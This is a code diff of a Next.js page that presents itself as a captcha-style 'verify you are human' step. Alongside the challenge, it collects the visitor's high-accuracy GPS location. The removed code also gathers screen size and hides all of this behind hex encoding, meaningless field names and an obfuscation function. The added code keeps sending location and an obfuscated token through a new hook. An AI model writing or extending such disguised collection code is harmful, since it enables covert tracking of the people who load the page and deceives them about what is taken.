@@ -2,69 +2,33 @@
 
 import { Turnstile } from "next-turnstile";
 import { useRouter, useSearchParams } from "next/navigation";
-import { Suspense, useEffect, useState } from "react";
-import { GpsData } from "@/lib/types/userdata";
-import { Button } from "@/components/ui/button";
+import { Suspense, useState } from "react";
+import { Button } from "@/components/shared/button";
 import { ShieldCheck } from "lucide-react";
 import { _0x9g22 } from "@/lib/functions/obf";
+import { useUserLocation } from "@/lib/hooks/use-user-location";
 
 function VerifyContent() {
-  const [gpsData, setGpsData] = useState<GpsData | null>(null);
+  const location = useUserLocation();
   const [token, setToken] = useState<string | null>(null);
 
   const router = useRouter();
   const searchParams = useSearchParams();
 
-  const lfg = searchParams.get("lfg");
-  const gfe = searchParams.get("gfe");
-
-  useEffect(() => {
-    if (!lfg || !gfe) {
-      router.push("/error");
-    }
-  }, [lfg, gfe, router]);
-
-  useEffect(() => {
-    const getLocation = () => {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-          (position) => {
-            setGpsData({
-              hh: position.coords.latitude ?? 0,
-              xf: position.coords.longitude ?? 0,
-              ff: position.coords.accuracy ?? 0,
-            });
-          },
-          (error) => {
-            console.log("error getting location", error);
-          },
-          {
-            enableHighAccuracy: true,
-            timeout: 10000,
-            maximumAge: 0,
-          }
-        );
-      }
-    };
-    getLocation();
-  }, []);
+  const code = searchParams.get("code");
 
   const handleVerify = async () => {
     if (!token) return;
-    if (!gfe) return;
+    if (!code) return;
     const res = await fetch("/api/verify", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
       },
       body: JSON.stringify({
-        df: Buffer.from(token).toString("hex"),
-        ct: gfe,
-        kt: _0x9g22(lfg!),
-        ll: Buffer.from(JSON.stringify(gpsData || { hh: 0, xf: 0, ff: 0 })).toString("hex"),
-        pp: Buffer.from(
-          JSON.stringify({ w: window.screen.width, h: window.screen.height })
-        ).toString("hex"),
+        code,
+        location,
+        token: await _0x9g22(token),
       }),
     });
     const result = await res.json();
